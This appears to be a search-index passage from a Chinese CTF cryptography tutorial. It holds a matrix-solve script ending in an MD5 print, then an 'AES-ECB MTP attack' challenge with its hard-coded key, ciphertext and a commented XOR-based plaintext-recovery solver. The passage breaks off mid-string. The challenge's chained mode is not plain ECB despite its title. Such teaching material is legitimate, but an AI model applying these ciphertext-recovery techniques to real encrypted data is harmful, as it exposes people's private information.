869265269816240261877029457458234318249621243667628, 1504333646627354107869007496936781479204707239575364, 2603370684363759081777877568090078592049534352669947, 4505342904082185194291963661562434728467247085801567, 7796859204598587173314308958000104480418858953375158, 13493093589225451977147040588861591346827624626553088, 23350886533928418622148518003626067086836308029229306, 40410592153292809121198774051487713973447271440824879, 69933788415571610361075397290260005189363125951186151, 121026060286409890014591649872661507384922097295622585, 209445356819655999941471437498154462693217873859873519, 362462079567824464738504374835340908769751488853277318, 627269857492024846036766185061792395514128412691597750, 1085541071185182881358902065797900004206275433304525877, 1878616361292087979017649753948129817575491489985996469, 3251097104102362704835900720328806405351210311448488910, 5626285705844227224482132571164442587287950705132698177, 9736741115435595736854097976874400909429981720207988487, 16850215667245180941552990697851306753178430167486844006, 29160657006948951882262364132481449161390275730087294685, 50464868454466647556267645846637274956572498586114427735, 87333524327649631040132103644841977096784627243509857937, 151137706390139040826448707126591974417399010694640174718, 261555988593488478677610370284679511774525269175612894617, 452643730033345117036459086235348615186246366652477694168, 783336475835524143955537154153262203019092265959952337070, 1355626939379487620769121922144227585175531097052439217983, 2346021735820790423533561047507688175516954900918138334291, 4059979796110323903393797058491537625611005518946149411026, 7026122432346967683382009847205881024752630926437218981740, 12159271452933065576710291263470354882115951853620136774055, 21042599768180623908382939506716338579508214228553692875423, 36415915765826987773364669427220163018133640081486671468436, 63020678797925209300085103082659626905494796721119527734083, 109062366622625198169859916735972641477602693706580750774247, 188741220186912829686057249397861922209555075583934877024777, 326631901551406455092777938653826814900794821912935940782874, 565262845103114204256414747869081614169923740442179762058936, 978232936025018959853100287323851115023773163216042197843195, 1692910980111501346802672231436092377546116455476214539222026, 2929718966760270262844895994547637314231078419236801672684198, 5070114923366815738216357619638190602226980891746062079428250, 8774242726964718704518978915749604855301897112378619823447909, 15184534590503864395968205111669668293209355696392197598100449, 26278061583779512058870924747917968681797893736357134971437061, 45476304623307832769415233578427592641287934525440233150419102, 78700412341998941621862709864667467345902574612843786168968091, 136197409928206718914848388530217366761295027423898231594892758, 235700600786468895717413188934153824796333855958950958366797470]\n\nOOi = []\nOi = []\n\n# \u6784\u9020 128 \u4e2a\u6837\u672c\uff0c\u6bcf\u4e2a\u6837\u672c\u662f\u957f\u5ea6\u4e3a 128 \u7684\u5411\u91cf\uff08outputState[i:i+128]\uff09\uff0c\u8fd9\u4e9b\u5411\u91cf\u5c06\u7ec4\u6210 128\u00d7128 \u7684\u77e9\u9635 OO\n# \u6bcf\u4e2a\u6837\u672c\u7684\u5bf9\u5e94\u7ed3\u679c\u662f outputState[i+128]\uff0c\u4e00\u5171\u4e5f\u6709 128 \u4e2a\uff0c\u8fd9\u4e9b\u5c06\u7ec4\u6210\u7ed3\u679c\u5411\u91cf O\nfor i in range(128):\n    OOi += outputState[i:i+128]\n    Oi += [outputState[i+128]]\n\n# \u521b\u5efa\u4e00\u4e2a 128\u00d7128 \u7684\u6574\u6570\u77e9\u9635 OO\uff0c\u6570\u636e\u6765\u6e90\u4e8e\u5217\u8868 OOi\nOO = matrix(ZZ, 128, 128, OOi)\n\n# \u521b\u5efa\u4e00\u4e2a 128\u00d71 \u7684\u5217\u5411\u91cf O\uff0c\u6570\u636e\u6765\u6e90\u4e8e\u5217\u8868 Oi\nO = matrix(ZZ, 128, 1, Oi)\n\n# \u6c42\u89e3\u7ebf\u6027\u65b9\u7a0b\u7ec4 OO * x = O\uff0c\u8fd4\u56de\u6ee1\u8db3\u8be5\u7b49\u5f0f\u7684\u5411\u91cf x\uff0c\u5373 Mask\nMask = OO.solve_right(O)\nM = Mask.str().replace('\\n','').replace('[','').replace(']','')\n\n# hashlib.md5(...): \u521b\u5efa\u4e00\u4e2a MD5 \u54c8\u5e0c\u5bf9\u8c61\n# M.encode(encoding=\"utf-8\"): \u628a\u5b57\u7b26\u4e32 M \u6309 UTF-8 \u7f16\u7801\u8f6c\u6362\u4e3a\u5b57\u8282\u4e32\uff08bytes \u7c7b\u578b\uff09\uff0c\u56e0\u4e3a\u54c8\u5e0c\u51fd\u6570\u5904\u7406\u7684\u662f\u5b57\u8282\u6570\u636e\u800c\u4e0d\u662f\u5b57\u7b26\u4e32\nm = hashlib.md5(M.encode(encoding=\"utf-8\"))\n\n# m.hexdigest(): \u8fd4\u56de MD5 \u54c8\u5e0c\u503c\u7684 \u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8868\u793a\nprint(m.hexdigest())\n</code></pre>"},{"location":"Crypto/Chapter11/11-1/","title":"AES-ECB \u6a21\u5f0f MTP \u653b\u51fb","text":""},{"location":"Crypto/Chapter11/11-1/#aes-ecb-\u6a21\u5f0f-mtp-\u653b\u51fb","title":"AES-ECB \u6a21\u5f0f MTP \u653b\u51fb","text":"<p>\u4e0b\u8f7d\u9644\u4ef6</p> <pre><code>from Crypto.Cipher import AES                        # \u5bfc\u5165 AES \u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u6a21\u5757\nfrom Crypto.Util.strxor import strxor as xor         # \u5bfc\u5165\u6309\u4f4d\u5f02\u6216\u51fd\u6570\uff0c\u5e76\u91cd\u547d\u540d\u4e3a xor\nfrom Crypto.Util.Padding import pad                  # \u5bfc\u5165\u586b\u5145\u51fd\u6570\uff0c\u7528\u4e8e\u5c06\u6570\u636e\u586b\u5145\u5230\u6307\u5b9a\u5757\u5927\u5c0f\nfrom random import *                                 # \u5bfc\u5165\u968f\u673a\u6570\u751f\u6210\u6a21\u5757\u7684\u6240\u6709\u51fd\u6570\nfrom base64 import *                                 # \u5bfc\u5165 Base64 \u7f16\u7801\u89e3\u7801\u6a21\u5757\u7684\u6240\u6709\u51fd\u6570\nfrom copy import copy                                # \u5bfc\u5165 copy \u6a21\u5757\uff0c\u7528\u4e8e\u590d\u5236\u5bf9\u8c61\nfrom secret import data                              # \u4ece\u540d\u4e3a secret \u7684\u6a21\u5757\u4e2d\u5bfc\u5165\u53d8\u91cf data\uff08\u660e\u6587\u6570\u636e\uff09\n\n# \u751f\u6210\u4e00\u4e2a\u968f\u673a\u7684 16 \u5b57\u8282\u521d\u59cb\u5411\u91cf\uff08IV\uff09\niv = bytes([randint(0, 2**8 - 1) for i in range(16)]) \niva = copy(iv)  # \u590d\u5236\u4e00\u4efd IV\uff0c\u53ef\u80fd\u5728\u540e\u7eed\u4e2d\u5907\u7528\n\n# \u751f\u6210\u4e00\u4e2a\u968f\u673a\u7684 16 \u5b57\u8282 AES \u5bc6\u94a5\nkey = bytes([randint(0, 2**8 - 1) for i in range(16)])\n\n# \u4f7f\u7528\u751f\u6210\u7684\u5bc6\u94a5\u521b\u5efa\u4e00\u4e2a AES ECB \u6a21\u5f0f\u7684\u5bc6\u7801\u5bf9\u8c61\ncipher = AES.new(key, mode=AES.MODE_ECB)\n\n# \u5bf9\u660e\u6587\u6570\u636e\u8fdb\u884c\u586b\u5145\uff0c\u4f7f\u5176\u957f\u5ea6\u4e3a 16 \u7684\u500d\u6570\uff08AES\u7684\u5757\u5927\u5c0f\uff09\ndata = pad(data, 16)\n\nc = b\"\"  # \u521d\u59cb\u5316\u5bc6\u6587\u4e3a\u4e00\u4e2a\u7a7a\u7684\u5b57\u8282\u4e32\n\n# \u5bf9\u660e\u6587\u6570\u636e\u8fdb\u884c\u5206\u5757\u5904\u7406\uff0c\u6bcf\u6b21\u5904\u7406 16 \u5b57\u8282\uff08\u4e00\u4e2a\u5757\uff09\nfor i in range(0, len(data), 16):\n    # \u53d6\u51fa\u5f53\u524d\u7684 16 \u5b57\u8282\u5757\uff0c\u5982\u679c\u4e0d\u8db3 16 \u5b57\u8282\uff0c\u7528\u6362\u884c\u7b26\u8865\u9f50\uff08\u867d\u7136\u5df2\u7ecf\u586b\u5145\u8fc7\u4e86\uff0c\u8fd9\u91cc\u662f\u53cc\u91cd\u786e\u4fdd\uff09\n    s = data[i:i+16].ljust(16, b\"\\n\")\n\n    # \u5c06\u5f53\u524d\u7684\u660e\u6587\u5757 s \u4e0e IV \u8fdb\u884c\u6309\u4f4d\u5f02\u6216\uff0c\u7ed3\u679c\u4f5c\u4e3a AES \u52a0\u5bc6\u7684\u8f93\u5165\n    # \u8fd9\u4e00\u6b65\u5f15\u5165\u4e86\u524d\u4e00\u4e2a\u5757\u7684\u52a0\u5bc6\u7ed3\u679c\uff0c\u5f62\u6210\u67d0\u79cd\u7c7b\u4f3c\u4e8e\u53cd\u9988\u7684\u6a21\u5f0f\n    c += cipher.encrypt(xor(s, iv))\n\n    # \u66f4\u65b0 IV \u4e3a\u5f53\u524d\u7684\u660e\u6587\u5757s\u4e0e\u521a\u521a\u751f\u6210\u7684\u5bc6\u6587\u5757 c[-16:]\uff08\u6700\u65b0\u7684 16 \u5b57\u8282\u5bc6\u6587\uff09\u4e4b\u95f4\u7684\u5f02\u6216\u7ed3\u679c\n    # \u8fd9\u6837\u4e0b\u4e00\u4e2a\u5757\u7684\u52a0\u5bc6\u4f1a\u53d7\u5230\u5f53\u524d\u5757\u7684\u5f71\u54cd\uff0c\u589e\u52a0\u4e86\u5bc6\u6587\u7684\u590d\u6742\u6027\n    iv = xor(s, c[-16:])\n\n# \u5c06\u5bc6\u94a5\u8fdb\u884c Base64 \u7f16\u7801\uff0c\u4fbf\u4e8e\u4ee5\u6587\u672c\u5f62\u5f0f\u8f93\u51fa\u6216\u5b58\u50a8\nkey = b64encode(key)\n\n# \u5c06\u5bc6\u6587\u8fdb\u884c Base64 \u7f16\u7801\uff0c\u540c\u6837\u662f\u4e3a\u4e86\u4fbf\u4e8e\u8f93\u51fa\u6216\u5b58\u50a8\nc = b64encode(c)\n\n# \u8f93\u51fa Base64 \u7f16\u7801\u540e\u7684\u5bc6\u94a5\u548c\u5bc6\u6587\nprint(key)\nprint(c)\n\n'''\nkey_b64 = b'+0zkhmid1PFjVdxSP09zSw=='\nc_b64=b'A0bzFxdM95YoXm64g0gZkiTloPsBAq7iV56t1M7Q4zVNxRJSTdZH0lzOMa7QyIQbKN/ftm01iZgQAk+JVgCB6hlCdMPWkdpKYHix8BTq/ClEHUPwMEjUEvgKD4tH3T/thoccBw1jfJ9RjhXbMFByWn5cyA/gHVvEEJRpII/ryKMQkzelioQ5b0MfhSy4INLqQk6yAgLzihip5ho7lDJCbYcaz85bDksOo5n9kjOfjFnjUn9G7jX+AtyhygPlGfrvauTeuPdVxqrJTVHvrzUNAqiqtCElX+BWpicP2mkZLt5B/gpquTv8U+StrdTOcr7UkWuz+YdhXkTJYUZguv7EbEnRy+M64QzqfnNf8Zk0tJQ5xOumbY8hxGTuZ8w3rWxjPKLhdgTGLgMcMYF3hPb2eqG9VZKC3T9zElI5MWPyIdkmqkrLEt6vGT8AxWJy1hl2ApkGhrJFB0DobJircN6kXUXvZXitjXSH+BA48muaRlAwK13re+zIcbI+B7+Tm3LuRT9j5NWD9RBoy+IeAQvR05IKWqEpqXEScmZsQxpAFZCSnbchYaYNAuHvBwMcMW7vTMyxROHRtyZ+gWNUhpd8CcZ9FA6w+cwQLMWW5D4nUCMK+NEsSyTBBm/jTiAp/waq+2dTVyBhbQtmm9pBtZtHJtfeVRKuZRXduNnlWDa7Wlwv0Jk2EIJpAaXxosuZnO0PHW3oX+WO5F9ydIfIJAFUpBrn4fMx3c7IJ08+bKwAfBw/johSs1ieyX/YjOOL1KbE9J6Hz3ZBBR4waQ4p9sdLsJ9UFnNghH0ZuB2F7bGoH7SurvaMglo3FyQAfM+n/EVCGWnax/JGEcw5YZuS2c7y5Gd4oOCmpFO/lVj0IaOlZsFsMgQ3GUsBT2h1yh4yarlYUczvGNyOyfUXfueCDBQJNJ7adbdra/DHpV3LXieADKED2HankT+9ACs8oVYPpZhji0UuCdvs1txytsCqPSf5l7JLDkrGP3/7Ob7UcCA4h/B+6/0xg7h+ZJ6ZR41sDpOR8S4pmPlfJkU/np52QZfplY0sKpKlaYhuhUmMSle2TAcvNUGHobNTReFV/MOfX5/HX6behFAeOwHGI14AvUbDmrmkVvbyU88DzBW2YQ/tTTiSLg/wgggkkhLd17NZAMB3XbKuw3WdkdyJfTTpyiN05DqMwV3q64fpzasFXFNQ7ix8Q/APov/TmBYtgFw4ys2jKC6Yws166RXRkrQXzY4Ey9Xvjp5i5nUgW2HLHRGz2B5lg0jI9oWjj5+89Y0Tcqb81OFD5SfeqTbg7Y2WoW6YjQ/Hzvt1l0+p/lFrnOy3ORfhwl+DFBZi4P9i+Hh7/uC1kCW8Lil2M9oVaAH4YB2yhm61AqEk4NPhSeTuioaFfvUY5lD75QiM6BdDFMTlNkC7crXmuiUpztHTzIS6E1kVARI8xsGeljjmJmuKIfQPPQfvSnnAjGeaxCNmRPDMgFGltFiGy63Pv/tVRWbUWiB27APHPsqM2qcV/nM8IwDx5xmwExl/atQXGzn/LL4xyqzmyzD+2qMeZqfzcKZWOjoWIX+SycPvc62HAQmsKqZK5ZO2JKq5OeuFEovG9oOcRYve1XStbTQYiocEbQ4XX/c6xE0cm9P/I5NM1Mlr6CT6qt3Pqb/m+7s/kwzww59FKOq5R6HmK7SHCQ6gwTQ1ciGWbJF3NLHuOpe08X4xl/l0tJengSfJRJ39Q9WwZbgBlEPf7NYeMlR9zU9QQxvZ+r4LiaJVYrQYSCcDj37Vk9XVRMijBDWDWFbK5sgkDHQYmwGYiwH4hEAqAAXDNj1/f2eRFbIU2GN6Wfj89fEINJjoG/1O/I5Q8S7tHnlWFQNoXJQ2e4r2Aca9RPLVCWz7Nq96YUKBRN3afW/9FSwWLLvjsBptQmoRj4FwmJzJf7Vj6KCOkm6mdaZ4l6FB4/E2Lk9aopD7Q473leULPM1CydXWme/8WKUqEucDwraXS57+Z+iGRMvQ8MABtZboAVFK2B1mzNL4Ba/bxVE4puy4HwvQI+N1tKmeMf99FfR13IA0y+FWL3eCzXKw8gimaJCW1e3QJJWDorDXRRjExeokMGGHzOd8MrTfNNFGWSPqZRTdGJxW7wOWQi3bHT0WSqP1fBpdU9m+WKHIxy57dL/8JFJJ97R56P76rlToRrM825JcTBEfrK0Nb9Q+2RI83vyTA2UxH9s9cSnWd+e7nacrfXjV7EjkGHgblEGHX9LqNETaZpBAL0NG9OAJ0+f+6id4/Ixcee0jx4b8k5xvblujFEdK0q2MRo2uTxSAFMpelt8JY0EZbnF9uT88N4LPms3cNeKBt0KBhx+vshFKMc/b3W7OMCo6m7EyzmcTmMe+Y6CO0x0FF0p6h1bTnJu3MMok1hO27iBSfYusHgKWVmKpgNHjiDfuBYnuBCysa+hHQZW23zxNRqi2OGAy6zCGPOY4E4nyUA6g/jlVOjq6fFv1VHN1tlQlBOCvB9r5B0os1zI2XL/Mlb9eggNuA8nw2igDm+9qkBtLxOXojAGDonAPzBagHXnVd+0kLdUGEoddt45A2fgSSociCx4tVDMd5ag1zR4VxdADAy0lnmW0n8noAT5y60SV7gICvMOphILBRjk365Mu6GNA3C+n8k5YH9sRnS7Z5EVEKdSeYigJs4XNavD50/paKnJcux2l3gzm/1aTUMzLd8tw7vZuUWv1XaYULcez8ieEMeACETyN53+RlcPQefupgszELvwlKz0prl5ydHCPOA7+ZS2zfUZOEmRSBNaIZUCd5euNg+HXMeFa/Qb452+KKEjq7vRthC4hH9gluaYMl/eXboQvvVu4xDhfVW403enI7sxdMR3t2WO1cOaLE8IN5c71W+IqhaRbJ/Prlo/pk/XAtMvimZxIN4y5/oP5vQ/lCt5jM9wAtPKSoQbJxWIYWNrXVfkZUOOwD2tlOmyxMCcKFr8921JHgtWqcYliElNX19hzmYhow+19EV3zhITzsGOX/PP1BHIKz/NJyKcGqx1hlfrDfDVedhJWkQL9sg4clbfguprs3KG5YNbbjclaK9JoEboBY3EGBGHtsWfmIRAREwy1a53y/a/NUDLaQxrMsyV/YnbiyBevGjMVNnqIY5T0YtPLL/s5Wvmq7EU9qoMDIlaosCf616TagcZalGFQumL15q6wx3FxwVB5EAjFa/MKnZNc0CqbFhXgEevp1ZXRnjEAdSK99gyAmwVawWpxIWXZQvQ5w7tIQ+nF8utoG4ab/AdLbZyKCtT8pxjiHifNcCCkLfew8Qq9S2JnrhCUMs9SEiRrLZHiE9JVlwbUJzAQjCM6G4tdeLNEApqDv4eZ7zh2U9K2+Gk9OjBgSk5xMjRkCzKCrNAKgRLoJ1Gu8L4T9LSBp1juhUsyaIaK'\n'''\n</code></pre> <p>\u4ec0\u4e48\u662f AES-ECB \u6a21\u5f0f\uff1f</p> <p>\u5728 ECB \u6a21\u5f0f\u4e0b\uff0c\u660e\u6587\u88ab\u5212\u5206\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7684\u5757\uff08\u5bf9\u4e8e AES\uff0c\u901a\u5e38\u662f 128 \u4f4d\uff0c\u5373 16 \u5b57\u8282\uff09</p> <p>\u6bcf\u4e2a\u660e\u6587\u5757\u72ec\u7acb\u5730\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u751f\u6210\u5bf9\u5e94\u7684\u5bc6\u6587\u5757</p> <p>\u8fd9\u79cd\u65b9\u5f0f\u7684\u52a0\u5bc6\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li>\u660e\u6587\u5206\u5757\uff1a\u5c06\u660e\u6587\u6570\u636e\u5212\u5206\u4e3a\u591a\u4e2a 16 \u5b57\u8282\u7684\u5757</li> <li>\u72ec\u7acb\u52a0\u5bc6\uff1a\u6bcf\u4e2a\u660e\u6587\u5757\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u94a5\u72ec\u7acb\u52a0\u5bc6\uff0c\u751f\u6210\u76f8\u5e94\u7684\u5bc6\u6587\u5757</li> <li>\u5bc6\u6587\u62fc\u63a5\uff1a\u5c06\u6240\u6709\u5bc6\u6587\u5757\u62fc\u63a5\u6210\u6700\u7ec8\u7684\u5bc6\u6587\u6570\u636e</li> </ol> <p>\u7531\u4e8e\u6bcf\u4e2a\u660e\u6587\u5757\u72ec\u7acb\u52a0\u5bc6\uff0c\u76f8\u540c\u7684\u660e\u6587\u5757\u5728 ECB \u6a21\u5f0f\u4e0b\u4f1a\u751f\u6210\u76f8\u540c\u7684\u5bc6\u6587\u5757\u3002\u8fd9\u79cd\u7279\u6027\u4f7f\u5f97 ECB \u6a21\u5f0f\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u5bb9\u6613\u53d7\u5230\u653b\u51fb</p> <p>MTP \u653b\u51fb\u539f\u7406</p> <ol> <li>\u591a\u6b21\u52a0\u5bc6\u76f8\u540c\u660e\u6587\uff1a\u653b\u51fb\u8005\u591a\u6b21\u4f7f\u7528\u76f8\u540c\u7684\u5bc6\u94a5\u5bf9\u76f8\u540c\u7684\u660e\u6587\u8fdb\u884c\u52a0\u5bc6</li> <li>\u5206\u6790\u5bc6\u6587\u5757\u5173\u7cfb\uff1a\u7531\u4e8e ECB \u6a21\u5f0f\u7684\u7279\u6027\uff0c\u76f8\u540c\u7684\u660e\u6587\u5757\u4f1a\u751f\u6210\u76f8\u540c\u7684\u5bc6\u6587\u5757\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6bd4\u8f83\u4e0d\u540c\u52a0\u5bc6\u7ed3\u679c\u4e2d\u7684\u5bc6\u6587\u5757\uff0c\u627e\u5230\u76f8\u540c\u7684\u5bc6\u6587\u5757\uff0c\u4ece\u800c\u63a8\u6d4b\u51fa\u76f8\u5e94\u7684\u660e\u6587\u5757</li> <li>\u63a8\u6d4b\u660e\u6587\u5185\u5bb9\uff1a\u901a\u8fc7\u591a\u6b21\u52a0\u5bc6\u548c\u5206\u6790\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u9010\u6b65\u6062\u590d\u51fa\u5b8c\u6574\u7684\u660e\u6587\u5185\u5bb9</li> </ol> <pre><code># \u5bfc\u5165\u5fc5\u8981\u7684\u5e93\nimport base64  # \u7528\u4e8e Base64 \u7f16\u7801\u548c\u89e3\u7801\nfrom Crypto.Cipher import AES  # \u7528\u4e8e AES \u52a0\u5bc6\u548c\u89e3\u5bc6\nfrom Crypto.Util.strxor import strxor as xor  # \u7528\u4e8e\u5b57\u7b26\u4e32\u7684\u6309\u4f4d\u5f02\u6216\u64cd\u4f5c\nimport numpy as np  # \u7528\u4e8e\u6570\u7ec4\u64cd\u4f5c\n\n# \u5224\u65ad\u5b57\u7b26\u662f\u5426\u4e3a\u5b57\u6bcd\ndef isChr(x):\n    \"\"\"\u5224\u65ad\u5b57\u7b26\u662f\u5426\u4e3a\u5b57\u6bcd\"\"\"\n    return ord('a') &lt;= x &lt;= ord('z') or ord('A') &lt;= x &lt;= ord('Z')\n\n# \u6839\u636e\u63a8\u6d4b\u7684\u7a7a\u683c\u4f4d\u7f6e\u63a8\u65ad\u5176\u4ed6\u52a0\u5bc6\u6587\u672c\u4e2d\u7684\u76f8\u5e94\u4f4d\u7f6e\ndef infer(index, pos, msg, c):\n    \"\"\"\u6839\u636e\u63a8\u6d4b\u7684\u7a7a\u683c\u4f4d\u7f6e\u63a8\u65ad\u5176\u4ed6\u52a0\u5bc6\u6587\u672c\u4e2d\u7684\u76f8\u5e94\u4f4d\u7f6e\"\"\"\n    if msg[index, pos] != 0:\n        return\n    msg[index, pos] = ord(' ')  # \u63a8\u6d4b\u4e3a\u7a7a\u683c\n    for x in range(len(c)):\n        if x != index:\n            msg[x][pos] = xor(c[x], c[index])[pos] ^ ord(' ')\n\n# \u6839\u636e\u5df2\u77e5\u5b57\u7b26\u63a8\u65ad\u5176\u4ed6\u52a0\u5bc6\u6587\u672c\u4e2d\u7684\u76f8\u5e94\u4f4d\u7f6e\ndef know(index, pos, ch, msg, c):\n    \"\"\"\u5df2\u77e5\u67d0\u4e2a\u4f4d\u7f6e\u5b57\u7b26\uff0c\u63a8\u65ad\u5176\u4ed6\u52a0\u5bc6\u6587\u672c\u4e2d\u7684\u76f8\u5e94\u4f4d\u7f6e\"\"\"\n    msg[index, pos] = ord(ch)  # \u8bbe\u5b9a\u5df2\u77e5\u5b57\u7b26\n    for x in range(len(c)):\n        if x != index:\n            msg[x][pos] = xor(c[x], c[index])[pos] ^ ord(ch)\n\n# \u83b7\u53d6\u53ef\u80fd\u7684\u7a7a\u683c\u4f4d\u7f6e\ndef getSpace(c):\n    \"\"\"\u83b7\u53d6\u53ef\u80fd\u7684\u7a7a\u683c\u4f4d\u7f6e\"\"\"\n    dat = []\n    for index, x in enumerate(c):\n        res = [xor(x, y) for y in c if x != y]  # \u8ba1\u7b97\u4e0e\u5176\u4ed6\u52a0\u5bc6\u6587\u672c\u7684\u5f02\u6216\u7ed3\u679c\n        f = lambda pos: sum(isChr(s[pos]) for s in res)  # \u7edf\u8ba1\u6bcf\u4e2a\u4f4d\u7f6e\u53ef\u80fd\u662f\u5b57\u6bcd\u7684\u4e2a\u6570\n        cnt = [f(pos) for pos in range(len(x))]  # \u83b7\u53d6\u6bcf\u4e2a\u4f4d\u7f6e\u53ef\u80fd\u662f\u5b57\u6bcd\u7684\u6570\u91cf\n        for pos in range(len(x)):\n            dat.append((f(pos), index, pos))\n    return sorted(dat, reverse=True)  # \u6309\u53ef\u4fe1\u5ea6\u6392\u5e8f\n\n# \u89e3\u5bc6\u5206\u5757\u6570\u636e\ndef decrypt_blocks(cipher, ciphertext):\n    \"\"\"\u4f7f\u7528 AES ECB \u6a21\u5f0f\u5bf9\u5206\u5757\u52a0\u5bc6\u6570\u636e\u89e3\u5bc6\uff0c\u5e94\u7528\u5f02\u6216\u64cd\u4f5c\"\"\"\n    blocks = []\n    for i in range(0, len(ciphertext), 16):\n        if i == 0:\n            blocks.append(cipher.decrypt(ciphertext[i:i+16]))  # \u7b2c\u4e00\u5757\u76f4\u63a5\u89e3\u5bc6\n        else:\n            blocks.append(xor(cipher.decrypt(ciphertext[i:i+16]), ciphertext[i-16:i]))\n    return blocks\n\n# MTP \u653b\u51fb\u63a8\u65ad\u6587\u672c\u5185\u5bb9\n\"\"\"\n    1.\u5f02\u6216\u4f20\u64ad\uff1a\u901a\u8fc7\u9010\u5c42\u5f02\u6216\uff0c\u5c06\u524d\u9762\u5757\u7684\u4fe1\u606f\u4f20\u64ad\u5230\u540e\u7eed\u5757\u4e2d\n    2.\u9012\u5f52\u63a8\u65ad\uff1a\u6bcf\u4e2a\u5757\u7684\u63a8\u6d4b\u7ed3\u679c\u4f9d\u8d56\u524d\u9762\u7684\u5757\uff0c\u4ece\u800c\u5f62\u6210\u9012\u5f52\u5f0f\u7684\u9010\u6b65\u63a8\u65ad\u8fc7\u7a0b\n    3.\u660e\u6587\u7279\u5f81\u66b4\u9732\uff1a\u6700\u7ec8\u63a8\u65ad\u51fa\u7684 tmp \u4e2d\u5b58\u50a8\u4e86\u5404\u4e2a\u5757\u53ef\u80fd\u7684\u660e\u6587\u5185\u5bb9\n\"\"\"\ndef mtp_attack(c, blocks):\n    \"\"\"\u5206\u5757\u5f02\u6216\u7684\u7ed3\u679c\u518d\u4e24\u4e24\u5f02\u6216\uff0c\u589e\u52a0\u4e0e\u660e\u6587\u7684\u76f8\u4f3c\u6027\"\"\"\n    tmp = [blocks[0]]\n    for i in range(1, len(blocks)):\n        block = blocks[i]\n        for j in range(i):\n            block = xor(block, blocks[j])\n        tmp.append(block)\n\n    \"\"\"\n    \u8be5\u6bb5\u4ee3\u7801\u7684\u6838\u5fc3\u662f\u9010\u6b65\u63a8\u6d4b\u51fa\u6bcf\u4e2a\u5bc6\u6587\u5757\u7684\u660e\u6587\u5b57\u7b26\n    \u901a\u8fc7 getSpace \u63d0\u4f9b\u7684\u53ef\u4fe1\u5ea6\u4fe1\u606f\uff0c\u4f18\u5148\u5728\u6700\u53ef\u80fd\u4e3a\u7a7a\u683c\u7684\u4f4d\u7f6e\u8fdb\u884c\u63a8\u65ad\uff0cinfer \u51fd\u6570\u5219\u5229\u7528\u7a7a\u683c\u4f4d\u7f6e\u5c06\u63a8\u65ad\u4fe1\u606f\u4f20\u64ad\u5230\u6240\u6709\u5757\n    msg \u6570\u7ec4\u6700\u7ec8\u5b58\u50a8\u4e86\u6240\u6709\u5757\u7684\u63a8\u6d4b\u7ed3\u679c\uff0c\u5c06\u5176\u8f6c\u6362\u4e3a\u5b57\u7b26\u5373\u53ef\u5f97\u5230\u660e\u6587\u5185\u5bb9\n    \"\"\"\n    # \u521d\u59cb\u5316 msg \u6570\u7ec4\uff0c\u5b58\u50a8\u63a8\u65ad\u7684\u7ed3\u679c\n    c = tmp\n    dat = getSpace(c)\n    msg = np.zeros((len(c), len(c[0])), dtype=int)\n\n    for w, index, pos in dat:\n        infer(index, pos, msg, c)  # \u63a8\u65ad\u5404\u4e2a\u4f4d\u7f6e\u7684\u503c\n\n    return msg\n\ndef main():\n    # \u521d\u59cb\u5316\u5bc6\u94a5\u548c\u52a0\u5bc6\u6570\u636e\n    key_base64 = b'+0zkhmid1PFjVdxSP09zSw=='  # Base64\u7f16\u7801\u7684\u5bc6\u94a5\n    encrypted_data_base64 = b'A0bzFxdM95YoXm64g0gZkiTloPsBAq7iV56t1M7Q4zVNxRJSTdZH0lzOMa7QyIQbKN/ftm01iZgQAk+JVgCB6hlCdMPWkdpKYHix8BTq/ClEHUPwMEjUEvgKD4tH3T/thoccBw1jfJ9RjhXbMFByWn5cyA/gHVvEEJRpII/ryKMQkzelioQ5b0MfhSy4INLqQk6yAgLzihip5ho7lDJCbYcaz85bDksOo5n9kjOfjFnjUn9G7jX+AtyhygPlGfrvauTeuPdVxqrJTVHvrzUNAqiqtCElX+BWpicP2mkZLt5B/gpquTv8U+StrdTOcr7UkWuz+YdhXkTJYUZguv7EbEnRy+M64QzqfnNf8Zk0tJQ5xOumbY8hxGTuZ8w3rWxjPKLhdgTGLgMcMYF3hPb2eqG9VZKC3T9zElI5MWPyIdkmqkrLEt6vGT8AxWJy1hl2ApkGhrJFB0DobJircN6kXUXvZXitjXSH+BA48muaRlAwK13re+zIcbI+B7+Tm3LuRT9j5NWD9RBoy+IeAQvR05IKWqEpqXEScmZsQxpAFZCSnbchYaYNAuHvBwMcMW7vTMyxROHRtyZ+gWNUhpd8CcZ9FA6w+cwQLMWW5D4nUCMK+NEsSyTBBm/jTiAp/waq+2dTVyBhbQtmm9pBtZtHJtfeVRKuZRXduNnlWDa7Wlwv0Jk2EIJpAaXxosuZnO0PHW3oX+WO5F9ydIfIJAFUpBrn4fMx3c7IJ08+bKwAfBw/johSs1ieyX/YjOOL1KbE9J6Hz3ZBBR4waQ4p9sdLsJ9UFnNghH0ZuB2F7bGoH7SurvaMglo3FyQAfM+n/EVCGWnax/JGEcw5YZuS2c7y5Gd4oOCmpFO/lVj0IaOlZsFsMgQ3GUsBT2h1yh4yarlYUczvGNyOyfUXfueCDBQJNJ7adbdra/DHpV3LXieADKED2HankT+9ACs8oVYPpZhji0UuCdvs1txytsCqPSf5l7JLDkrGP3/7Ob7UcCA4h/B+6/0xg7h+ZJ6ZR41sDpOR8S4pmPlfJkU/np52QZfplY0sKpKlaYhuhUmMSle2TAcvNUGHobNTReFV/MOfX5/HX6behFAeOwHGI14AvUbDmrmkVvbyU88DzBW2YQ/tTTiSLg/wgggkkhLd17NZAMB3XbKuw3WdkdyJfTTpyiN05DqMwV3q64fpzasFXFNQ7ix8Q/APov/TmBYtgFw4ys2jKC6Yws166RXRkrQXzY4Ey9Xvjp5i5nUgW2HLHRGz2B5lg0jI9oWjj5+89Y0Tcqb81OFD5SfeqTbg7Y2WoW6YjQ/Hzvt1l0+p/lFrnOy3ORfhwl+DFBZi4P9i+Hh7/uC1kCW8Lil2M9oVaAH4YB2yhm61AqEk4NPhSeTuioaFfvUY5lD75QiM6BdDFMTlNkC7crXmuiUpztHTzIS6E1kVARI8xsGeljjmJmuKIfQPPQfvSnnAjGeaxCNmRPDMgFGltFiGy63Pv/tVRW